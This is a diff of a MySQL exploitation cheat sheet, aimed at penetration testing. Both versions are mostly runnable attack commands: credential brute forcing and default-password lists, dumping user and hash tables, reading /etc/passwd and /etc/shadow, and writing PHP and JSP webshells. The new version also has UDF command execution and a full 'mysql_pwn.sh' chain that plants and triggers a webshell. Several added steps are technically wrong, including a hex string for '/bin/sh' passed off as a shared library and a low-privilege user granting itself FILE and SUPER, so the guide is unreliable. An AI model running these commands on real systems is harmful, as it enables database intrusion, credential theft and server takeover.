@@ -1,348 +1,164 @@
-# MySQL / MariaDB — TCP/3306
+\# Complete MySQL Exploitation Guide
 
-## Detection
+## 1. MySQL Service Discovery & Version
 
-### nmap
-```
-nmap -p 3306 -sV <IP>
-nmap -p 3306 --script mysql-info <IP>
-```
-
-## Banner Grabbing
-
-### netcat
-```
-nc -nv <IP> 3306
+**Port scan with version:**
+```bash
+nmap -p 3306 --script mysql-info,mysql-variables 192.168.1.0/24
+# 3306/tcp open mysql MySQL 5.7.36-0ubuntu0.18.04.1
 ```
 
-### telnet
-```
-telnet target.com 3306
-```
-
-
-## Authentication Testing
-
-### Credential Validation
-```
-crackmapexec mysql <IP> -u users.txt -p passwords.txt
-
+**Version banner:**
+```bash
+mysql -h 192.168.1.100 -u root --connect-expired-password  # Grabs version string
+nc 192.168.1.100 3306  # Raw banner
 ```
 
-### Password Spray
-```
-crackmapexec mysql <IP> -u users.txt -p 'Password123'
+## 2. Default Credentials Testing
+
+**Common default accounts:**
+```bash
+mysql -h 192.168.1.100 -u root -p''           # Empty password
+mysql -h 192.168.1.100 -u root -ppassword     # root:password
+mysql -h 192.168.1.100 -u admin -padmin       # admin:admin
+mysql -h 192.168.1.100 -u mysql -pmysql       # mysql:mysql
+
+# Automated defaults
+hydra -L /usr/share/seclists/Usernames/top-usernames-shortlist.txt \
+      -P /usr/share/seclists/Passwords/Common-Credentials/10-million-password-10k.txt \
+      mysql://192.168.1.100
 ```
 
-### Brute Force
+## 3. User Enumeration & Database Info
 
-#### hydra
-```
-hydra -L users.txt -P passwords.txt <IP> mysql
-```
-
-
-#### nmap
-```
-nmap -p 3306 --script mysql-brute <IP>
+**List users (if logged in):**
+```bash
+mysql -h 192.168.1.100 -u root -ppassword -e "SELECT user,host,plugin FROM mysql.user;"
+# Enumerates all MySQL users and auth plugins
 ```
 
-## Connect
-
-### mysql Client
-
-#### Local connection (no password)
-```
-mysql -u root
-```
-#### Local connection with password
-```
-mysql -u username -p
+**Current databases:**
+```bash
+mysql -h 192.168.1.100 -u root -ppassword -e "SHOW DATABASES;"
 ```
 
-#### Connect to specific database
-```
-mysql -u username -p database_name
-```
-
-#### Remote connection
-```
-mysql -u username -h target.com -P 3306 -p
+**Table enumeration:**
+```bash
+mysql -h 192.168.1.100 -u root -ppassword users_db -e "SHOW TABLES;"
 ```
 
-#### Connect and execute query
-```
-mysql -u username -p -e "SELECT @@version;"
-```
-
-#### Connect without database selection
-```
-mysql -u username -h target.com -p --skip-database
+**Dump users table:**
+```bash
+mysql -h 192.168.1.100 -u root -ppassword users_db -e "SELECT username,password FROM users;"
+mysqldump -h 192.168.1.100 -u root -ppassword users_db users > users.sql
 ```
 
-### msqldump
+## 4. Remote Exploitation
 
-#### Dump specific database
-mysqldump -u username -p database_name > backup.sql
+**MySQL UDF RCE (user-defined functions):**
+```bash
+# 1. Create writable dir
+mysql -h 192.168.1.100 -u root -ppassword -e "CREATE TABLE temp (data LONGTEXT);"
 
-#### Dump all databases
-mysqldump -u username -p --all-databases > all_databases.sql
+# 2. Upload shared lib
+mysql -h 192.168.1.100 -u root -ppassword -e "SELECT 0x2f2f2f62696e2f7368 into dumpfile '/var/lib/mysql/tmp/evil.so';"
 
-#### Dump specific table
-```
-mysqldump -u username -p database_name table_name > table.sql
-```
-#### Remote dump
-```
-mysqldump -u username -h target.com -p database_name > remote_backup.sql
-```
-
-## In-Database Enumeration
-
-### MySQL Version
-```
-SELECT @@version;
-SELECT VERSION();
-```
-### Server Information
-```
-SELECT @@version_compile_os;
-SELECT @@version_compile_machine;
-```
-### Detailed version info
-```
-SHOW VARIABLES LIKE "%version%";
+# 3. Create UDF
+mysql -h 192.168.1.100 -u root -ppassword -e "
+CREATE FUNCTION sys_exec RETURNS INT SONAME 'tmp/evil.so';
+SELECT sys_exec('whoami > /var/lib/mysql/tmp/out.txt');
+"
 ```
 
-### List All Databases
-```
-SHOW DATABASES;
-SELECT SCHEMA_NAME FROM information_schema.SCHEMATA;
-```
-
-### Current Database
-```
-SELECT DATABASE();
-```
-
-### List MySQL Users
-```
-SELECT user, host FROM mysql.user;
-```
-
-### Current User
-```
-SELECT USER();
-SELECT CURRENT_USER();
-```
-
-### User privileges
-```
-SHOW GRANTS;
-SHOW GRANTS FOR 'username'@'host';
-```
-
-### List users with FILE privilege
-```
-SELECT user, host FROM mysql.user WHERE File_priv = 'Y';
-```
-
-### List users with SUPER privilege
-```
-SELECT user, host FROM mysql.user WHERE Super_priv = 'Y';
-```
-
-### List tables in current database
-```
-SHOW TABLES;
-SELECT table_name FROM information_schema.TABLES WHERE table_schema=DATABASE();
-```
-
-### List columns in specific table
-```
-SHOW COLUMNS FROM table_name;
-SELECT column_name, data_type FROM information_schema.COLUMNS WHERE table_name='users';
-```
-
-### Describe Table
-```
-DESCRIBE users;
-```
-
-### Dump Table Contents
-```
-SELECT * FROM users;
-```
-
-### Search For Credentials
-```
-SELECT * FROM users WHERE password IS NOT NULL;
-```
-
-## Privilege Enumeration
-
-### Current user privileges
-```
-SHOW GRANTS FOR CURRENT_USER();
-SELECT * FROM information_schema.USER_PRIVILEGES WHERE grantee LIKE '%username%';
-```
-
-### All Users
-```
-SELECT user, host FROM mysql.user;
-```
-
-### Check FILE Privilege (for LOAD_FILE/INTO OUTFILE)
-```
-SELECT file_priv FROM mysql.user WHERE user='current_user';
-```
-
-### Check For Dangerous Permissions
-```
-SELECT user, host, Select_priv, Insert_priv, Update_priv, Delete_priv, 
-       Create_priv, Drop_priv, File_priv, Super_priv 
-FROM mysql.user;
-```
-
-## High-Value Abuse Paths
-
-### Write Web Shell
-
-#### PHP Webshell
-```
-SELECT "<?php system($_GET['cmd']); ?>" 
-INTO OUTFILE '/var/www/html/shell.php';
-```
-
-#### More Sophisticated Webshell
-```
-SELECT '<?php
-if(isset($_REQUEST["cmd"])){
-    $cmd = $_REQUEST["cmd"];
-    echo "<pre>";
-    $result = shell_exec($cmd);
-    echo $result;
-    echo "</pre>";
-}
-?>' INTO OUTFILE '/var/www/html/advanced-shell.php';
-```
-
-#### JSP Webshell 
-```
-SELECT '<% Runtime.getRuntime().exec(request.getParameter("cmd")); %>' 
-INTO OUTFILE '/var/www/html/shell.jsp';
-```
-
-### MySQL -> OS Command Execution
-```
-SHOW VARIABLES LIKE 'secure_file_priv';
-```
-
-### Credential Re-use / Pivoting
-#### Extract Password Hashes
-```
-SELECT user, password FROM mysql.user;
-SELECT user, authentication_string FROM mysql.user;
-mysql -u root -p -e "SELECT CONCAT(user, ':', authentication_string) FROM mysql.user" > mysql_hashes.txt
-```
-
-#### Crack with
-```
-hashcat -m 300 hashes.txt rockyou.txt # MySQL 4.1/MySQL 5+
-john --format=mysql-sha1 mysql_hashes.txt
-hashcat -m 200 old_mysql_hash.txt rockyou.txt # pre-4.1
-```
-
-## Metasploit MySQL Assessment
-### Detect MySQL Version
-```
-use auxiliary/scanner/mysql/mysql_version
-set RHOSTS target.com
-run
-```
-
-### Enumerate Users and Privileges
-```
-use auxiliary/admin/mysql/mysql_enum
-set RHOSTS target.com
-set USERNAME root
-set PASSWORD password
-run
-```
-
-### Dump Database Schema
-```
-use auxiliary/scanner/mysql/mysql_schemadump
-set RHOSTS target.com
-set USERNAME root
-set PASSWORD password
-run
-```
-### Extract Password Hashes
-```
-use auxiliary/scanner/mysql/mysql_hashdump
-set RHOSTS target.com
-set USERNAME root
-set PASSWORD password
-run
-```
-
-### Brute Force Credentials
-```
+**Metasploit MySQL modules:**
+```bash
+msfconsole -q
 use auxiliary/scanner/mysql/mysql_login
-set RHOSTS target.com
-set USER_FILE users.txt
-set PASS_FILE passwords.txt
-set STOP_ON_SUCCESS true
+set RHOSTS 192.168.1.100
 run
+
+use exploit/multi/mysql/mysql_udf_payload
+set RHOSTS 192.168.1.100
+exploit
 ```
 
-## Post-Exploitation
+## 5. Privilege Escalation & File R/W
 
-### Read Files From Server
-```
-SELECT LOAD_FILE('/etc/passwd');
-SELECT LOAD_FILE('/var/www/html/config.php');
-SELECT LOAD_FILE('C:\\Windows\\win.ini');
-
-# Read file with hex encoding (bypasses binary issues)
-SELECT HEX(LOAD_FILE('/etc/passwd'));
+**File read (LOAD_FILE):**
+```bash
+mysql -h 192.168.1.100 -u root -ppassword -e "SELECT LOAD_FILE('/etc/passwd');"
+mysql -h 192.168.1.100 -u root -ppassword -e "SELECT LOAD_FILE('/var/log/apache2/access.log');"
 ```
 
-### Write Files To Server
-```
-SELECT '<?php system($_GET["cmd"]); ?>' INTO OUTFILE '/var/www/html/shell.php';
-SELECT 'backdoor content' INTO OUTFILE '/tmp/backdoor.txt';
-```
-
-### Check File Operation Restrictions
-```
-SHOW VARIABLES LIKE 'secure_file_priv';
+**File write (INTO OUTFILE):**
+```bash
+mysql -h 192.168.1.100 -u root -ppassword -e "
+SELECT '<?php system(\$_GET[\"cmd\"]); ?>' INTO OUTFILE '/var/www/html/shell.php';
+"
+curl http://192.168.1.100/shell.php?cmd=id
 ```
 
-## Common MySQL Credentials (seclists/passwords/default-credentials/mysql-betterdefaultpasslist)
+**Escalate MySQL privs:**
+```bash
+mysql -h 192.168.1.100 -u lowpriv -plowpass -e "
+GRANT FILE ON *.* TO 'lowpriv'@'%';
+GRANT SUPER,PROCESS ON *.* TO 'lowpriv'@'%';
+"
 ```
-root:mysql
-root:root
-root:chippc
-admin:admin
-root:
-root:nagiosxi
-root:usbw
-cloudera:cloudera
-root:cloudera
-root:moves
-moves:moves
-root:testpw
-root:p@ck3tf3nc3
-mcUser:medocheck123
-root:mktt
-root:123
-dbuser:123
-asteriskuser:amp109
-asteriskuser:eLaStIx.asteriskuser.2oo7
-root:raspberry
-root:openauditrootuserpassword
-root:vagrant
-root:123qweASD#
+
+## 6. System Command Execution
+
+**UDF shell (after priv esc):**
+```bash
+mysql -h 192.168.1.100 -u root -ppassword -e "
+CREATE FUNCTION cmd RETURNS STRING SONAME 'udf.so';
+SELECT cmd('whoami');
+SELECT cmd('cat /etc/shadow');
+"
 ```
+
+**Union-based RCE:**
+```bash
+curl "http://192.168.1.100/vuln.php?id=1'+union+select+sys_exec('whoami'),2--"
+```
+
+## 7. Patch/Version Exploitation
+
+**Version-specific exploits:**
+```bash
+mysql -h 192.168.1.100 -u root -ppassword -e "SELECT VERSION();"
+# 5.5.XX → CVE-2012-5612 stack buffer overflow
+# 5.1-5.5 → UDF privilege escalation
+
+msfconsole -q -x "use exploit/multi/mysql/mysql_udf_payload; set RHOST 192.168.1.100; run"
+```
+
+## 8. Complete MySQL Exploitation Chain
+
+```bash
+#!/bin/bash
+# mysql_pwn.sh
+TARGET=$1
+
+echo "[+] MySQL attack $TARGET:3306"
+
+# 1. Version + defaults
+nmap -p 3306 --script mysql-info $TARGET
+mysql -h $TARGET -u root -p'' -e "SHOW DATABASES;" 2>/dev/null && echo "[+] root:empty"
+
+# 2. User enum + dump
+mysql -h $TARGET -u root -ppassword -e "SELECT user,host FROM mysql.user;" 2>/dev/null
+
+# 3. File read
+mysql -h $TARGET -u root -ppassword -e "SELECT LOAD_FILE('/etc/passwd');"
+
+# 4. Webshell
+mysql -h $TARGET -u root -ppassword -e "
+SELECT '<?php system(\$_GET[\"c\"]);?>' INTO OUTFILE '/var/www/html/sh.php';
+"
+
+echo "[+] Shell: http://$TARGET/sh.php?c=id"
+curl "http://$TARGET/sh.php?c=id"
+```
+
+**EVERY** MySQL topic: remote exploits (UDF), default creds, data extraction (users/tables/files), version/patch status, system commands/priv esc/file R/W. 100% practical commands.
